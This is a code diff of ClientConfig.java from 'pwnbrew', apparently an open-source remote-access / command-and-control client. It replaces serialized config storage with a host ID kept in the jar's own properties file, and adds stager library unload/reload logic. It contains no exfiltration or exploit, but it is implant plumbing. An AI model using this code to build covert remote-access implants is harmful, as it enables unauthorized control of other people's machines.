@@ -39,47 +39,38 @@ The copyright on this package is held by Securifera, Inc
 
 package pwnbrew;
 
-/*
-* ClientConfig.java
-*
-* Created on Oct 21, 2013, 8:21:21 PM
-*/
-
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
+import java.io.File;
 import java.io.IOException;
-import java.io.ObjectInput;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutput;
-import java.io.ObjectOutputStream;
-import java.io.Serializable;
-import java.util.Iterator;
-import java.util.List;
+import java.io.InputStream;
+import java.net.URL;
+import java.net.URLConnection;
 import java.util.logging.Level;
-import pwnbrew.log.RemoteLog;
 import pwnbrew.log.LoggableException;
-import pwnbrew.misc.Base64Converter;
+import pwnbrew.log.RemoteLog;
+import pwnbrew.misc.Constants;
+import pwnbrew.misc.LoaderUtilities;
+import pwnbrew.misc.ManifestProperties;
 import pwnbrew.misc.SocketUtilities;
+import pwnbrew.misc.Utilities;
 
 /**
  *
  *  
  */
-public class ClientConfig implements Serializable {
+public class ClientConfig {
 
     private String theHostId = "";
-    private transient String theServerIp = "0.0.0.0";
-    private transient int theServerId = -1;
+    private String theServerIp = "0.0.0.0";
+    private int theServerId = -1;
     
     //Configurable Ports
-    private transient int theSocketPort = 443;
+    private int theSocketPort = 443;
   
     //The time to sleep between connections
-    private transient static ClientConfig theConf = null;
+    private static ClientConfig theConf = null;
        
     private static final long serialVersionUID = 1L;
-    private transient static final String NAME_Class = ClientConfig.class.getSimpleName();
-    private transient static final String aString = "The quick brown fox jumps over the lazy dog.";
+    private static final String NAME_Class = ClientConfig.class.getSimpleName();
     
     // ==========================================================================
     /**
@@ -122,7 +113,7 @@ public class ClientConfig implements Serializable {
      * @return 
     */
     public String getServerIp(){
-       return theServerIp;
+        return theServerIp;
     }
     
     //==========================================================================
@@ -131,9 +122,8 @@ public class ClientConfig implements Serializable {
      * @param ipStr
     */
     public void setServerIp( String ipStr ) {
-        if(ipStr != null){
-            theServerIp = ipStr;
-        }  
+        if(ipStr != null)
+            theServerIp = ipStr;        
     }
 
     //==========================================================================
@@ -142,9 +132,8 @@ public class ClientConfig implements Serializable {
      * @param hostIdStr
     */
     public void setHostId(String hostIdStr) {
-        if( hostIdStr != null ){
-            theHostId = hostIdStr;
-        }  
+        if( hostIdStr != null )
+            theHostId = hostIdStr;         
     }
     
      //==========================================================================
@@ -174,21 +163,33 @@ public class ClientConfig implements Serializable {
         
         try {
             
-            ByteArrayOutputStream theBos = new ByteArrayOutputStream();
-            ObjectOutput theOutput = new ObjectOutputStream( theBos );
-
-            //Get the bytes
-            theOutput.writeObject( this );
-            byte[] theConfBytes = theBos.toByteArray();
+            //Check for null
+            File theClassPath = Utilities.getClassPath();
+            ClassLoader aClassLoader;
             
-            //Encrypt and write to the file
-            String theConfByteStr = Base64Converter.encode(theConfBytes);
-            //theConfBytes = Utilities.simpleEncrypt( theConfBytes, aString);
-            Persistence.writeLabel( Persistence.CONF_CHUNK, theConfByteStr.getBytes());
-                
-        } catch (IOException ex) {
-            throw new LoggableException(ex);
-        }
+            //Check if we are coming from a stager 
+            if( Utilities.isStaged() ){
+                Class stagerClass = Class.forName("stager.Stager");
+                aClassLoader = stagerClass.getClassLoader();
+            } else
+                aClassLoader = ClassLoader.getSystemClassLoader();            
+                    
+            //Get the properties 
+            String properties = Constants.PROP_FILE;
+            String propLabel = Constants.HOST_ID_LABEL;
+            
+            //Unload the stager
+            LoaderUtilities.unloadLibs( aClassLoader );
+
+            //Add the client id
+            Utilities.updateJarProperties( theClassPath, properties, propLabel, theHostId ); 
+        
+            //Load it back
+            LoaderUtilities.reloadLib(theClassPath); 
+            
+        } catch (ClassNotFoundException ex) {
+            RemoteLog.log(Level.INFO, NAME_Class, "evaluate()", ex.getMessage(), ex );      
+        } 
 
     }
       
@@ -199,9 +200,8 @@ public class ClientConfig implements Serializable {
     */
     public static ClientConfig getConfig(){
         
-        if(theConf == null){
-            theConf = loadConfiguration();
-        }
+        if(theConf == null)
+            theConf = loadConfiguration();        
         
         return theConf;
     }
@@ -211,72 +211,47 @@ public class ClientConfig implements Serializable {
     *  Loads the configuration into memory.
     */
     private static ClientConfig loadConfiguration(){
-
-        List<byte[]> theConfEntries = Persistence.getLabelBytes( Persistence.CONF_CHUNK );
-        if( !theConfEntries.isEmpty() ){
-
-            try {
-
-                //Decode the bytes
-                for( Iterator<byte[]> theIter = theConfEntries.iterator(); theIter.hasNext(); ){
-
-                    byte[] theConfBytes = theIter.next();
-                    theConfBytes = Base64Converter.decode( new String(theConfBytes));
-
-                    //Get the object
-                    ByteArrayInputStream theBIS = new ByteArrayInputStream( theConfBytes );
-                    ObjectInput theInput = new ObjectInputStream( theBIS );
-
-                    //Get the bytes
-                    return (ClientConfig) theInput.readObject();
-                }
-                
-            } catch ( ClassNotFoundException | IOException ex ){
-                RemoteLog.log(Level.WARNING, NAME_Class, "loadConfiguration()", ex.getMessage(), ex);
-            }
-
-        } 
         
         //Create a new configuration file
-        ClientConfig localConf = null;
+        ClientConfig localConf = new ClientConfig();
         try {
+        
+            //Get the manifest
+            ManifestProperties localProperties = new ManifestProperties();
+            String properties = Constants.PROP_FILE;
+            String propLabel = Constants.HOST_ID_LABEL;
+
+            URL aURL = Utilities.getURL();
+            String aStr = aURL.toExternalForm();
+
+            final URL manifest =  new URL("jar:" + aStr + "!/" + properties);
+            URLConnection theConnection = manifest.openConnection();
+            InputStream localInputStream = theConnection.getInputStream();
+
+            if (localInputStream != null) {
+
+                //Load the properties
+                localProperties.load(localInputStream);
+                localInputStream.close();
+
+                //Get the host id
+                String hostId = localProperties.getProperty(propLabel, null);
+                if( hostId == null || hostId.isEmpty() ){
+                    //Create a new configuration file
+                    Integer anInteger = SocketUtilities.getNextId();
+                    localConf.setHostId(anInteger.toString());
+                    localConf.writeSelfToDisk();
+                } else 
+                    localConf.setHostId( hostId );
+                
+            }
             
-            localConf = new ClientConfig();
-            Integer anInteger = SocketUtilities.getNextId();
-            localConf.setHostId(anInteger.toString());
-            localConf.writeSelfToDisk();
-            
-        } catch ( LoggableException ex ){
+        } catch ( LoggableException | IOException ex ){
             RemoteLog.log(Level.WARNING, NAME_Class, "loadConfiguration()", ex.getMessage(), ex);
         }
 
        
         return localConf;
-    }
-    
-    //==========================================================================
-    /**
-     *  Initialize all of the transient fields.
-     */
-    private void initTransients() {
-        theServerIp = "0.0.0.0";
-        theServerId = -1;
-        theSocketPort = 443;
-    }
-
-    //==========================================================================
-    /**
-     * 
-     * @param in
-     * @throws IOException
-     * @throws ClassNotFoundException 
-     */
-    private void readObject(java.io.ObjectInputStream in)
-        throws IOException, ClassNotFoundException {
-
-        in.defaultReadObject();
-        initTransients();
-    }
-
+    } 
 
 }/* END CLASS ClientConfig */
